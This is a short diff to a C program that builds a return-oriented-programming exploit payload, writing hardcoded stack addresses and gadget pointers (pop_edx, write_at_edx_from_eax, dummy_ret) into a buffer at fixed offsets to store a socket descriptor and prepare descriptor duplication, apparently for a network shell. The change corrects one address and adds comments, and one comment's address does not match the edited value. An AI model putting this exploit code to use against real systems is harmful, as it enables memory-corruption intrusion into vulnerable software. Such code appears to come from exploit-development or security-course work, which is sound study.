@@ -44,7 +44,7 @@ int main(void)
   char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239
 
   // storing fd
-  char con_fd_addr[] = "\x98\x68\xbf\xbf"; // bufr + 379, bfbf6898
+  char con_fd_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383, 0xbfbf6898
   char dup_fd_addr1[] = "";
   char dup_fd_addr2[] = "";
   char dup_fd_addr3[] = "";
@@ -125,8 +125,8 @@ int main(void)
   strcpy(bufr + 239, "\x01\x01\x01\x01");
   // ------------------------------------------------------------------------------- store fd in stack
   // pop all the address into edx one by one, then write fd to the locations
-  strcpy(bufr + 243, pop_edx);
-  strcpy(bufr + 247, con_fd_addr);
+  strcpy(bufr + 243, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 247, con_fd_addr); // 0xbbb52d79, location is 0xbbb52d79
   strcpy(bufr + 251, write_at_edx_from_eax);
   strcpy(bufr + 255, dummy_ret); // pop_edx
   strcpy(bufr + 259, dummy_ret); // dup_fd_addr1
